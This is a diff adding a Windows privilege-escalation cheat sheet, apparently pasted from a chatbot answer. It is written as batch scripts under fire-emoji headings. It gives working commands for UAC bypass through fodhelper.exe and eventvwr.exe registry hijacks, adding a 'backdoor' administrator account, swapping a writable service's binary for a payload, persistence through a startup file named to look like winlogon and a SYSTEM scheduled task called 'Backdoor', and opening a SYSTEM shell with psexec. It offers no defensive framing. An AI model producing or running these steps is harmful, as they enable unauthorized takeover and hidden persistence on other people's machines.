@@ -1,0 +1,74 @@
+⚠️ PRE-CHECK (Run this first)
+Before escalating, gather system info:
+
+bat
+Copy
+Edit
+@echo off
+whoami /priv
+whoami /groups
+net session
+net localgroup administrators
+net user %username%
+🔥 1. Bypass UAC Using fodhelper.exe
+Works if UAC is set to "Default" and you're a local admin (but not elevated):
+
+bat
+Copy
+Edit
+@echo off
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c start cmd.exe" /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
+start fodhelper.exe
+This opens an elevated command prompt.
+
+🔥 2. Bypass UAC Using eventvwr.exe
+Similar concept:
+
+bat
+Copy
+Edit
+@echo off
+reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
+start eventvwr.exe
+🔥 3. Create Admin User (If Running as Admin)
+bat
+Copy
+Edit
+@echo off
+net user backdoor Pass123! /add
+net localgroup administrators backdoor /add
+🔥 4. Abuse Writable Service (Replace Binary)
+If you found a vulnerable service (e.g., its executable path is writable), replace it with your payload:
+
+bat
+Copy
+Edit
+@echo off
+sc stop VulnService
+copy /y payload.exe "C:\Program Files\VulnApp\VulnService.exe"
+sc start VulnService
+🔍 Use accesschk.exe to find writable services.
+
+🔥 5. Startup Folder Persistence (Executes with Next Login)
+bat
+Copy
+Edit
+@echo off
+copy payload.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winlogon.bat"
+🔥 6. Drop Scheduled Task with SYSTEM Privileges
+bat
+Copy
+Edit
+@echo off
+schtasks /create /tn "Backdoor" /tr "C:\Temp\payload.bat" /sc onlogon /rl highest /f
+If allowed, the task runs as SYSTEM on next login.
+
+🔥 7. Token Impersonation via PsExec (If SYSTEM Access)
+bat
+Copy
+Edit
+@echo off
+psexec.exe -i -s cmd.exe
+You’ll get a SYSTEM shell.
+
